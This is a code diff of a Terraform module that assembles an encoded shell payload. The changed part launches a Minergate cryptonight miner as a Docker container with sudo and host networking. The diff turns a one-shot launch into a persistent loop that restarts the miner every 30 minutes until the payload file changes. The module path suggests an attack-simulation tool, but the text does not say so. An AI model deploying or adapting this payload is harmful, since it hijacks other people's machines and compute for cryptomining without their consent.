@@ -9,25 +9,22 @@ locals {
     minergate_user=var.inputs["minergate_user"]
 
     payload = <<-EOT
-    LOGFILE=/tmp/${var.inputs["tag"]}.log
-    function log {
-        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
-        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
-    }
-    MAXLOG=2
-    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
-    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
-    check_package_manager() {
-        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
-    }
-    while check_package_manager; do
-        log "Waiting for package manager to be available..."
-        sleep 10
+    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
+    while true; do
+        if [[ `sudo docker ps | grep ${local.minergate_name}` ]]; then docker stop ${local.minergate_name}; fi
+        sudo docker run --rm -d --network=host --name ${local.minergate_name} ${local.minergate_image} -a cryptonight -o ${local.minergate_server} -u ${ local.minergate_user } -p x
+        sudo docker ps -a >> $LOGFILE 2>&1
+        log 'waiting 30 minutes...';
+        sleep 1800
+        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
+        if [ "$CHECK_HASH" != "$START_HASH" ]; then
+            log "payload update detected - exiting loop"
+            break
+        else
+            log "restarting loop..."
+        fi
     done
-    if [[ `sudo docker ps | grep ${local.minergate_name}` ]]; then docker stop ${local.minergate_name}; fi
-    sudo docker run --rm -d --network=host --name ${local.minergate_name} ${local.minergate_image} -a cryptonight -o ${local.minergate_server} -u ${ local.minergate_user } -p x
-    sudo docker ps -a >> $LOGFILE 2>&1
-    log "done"
+    log "Done."
     EOT
     
     base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
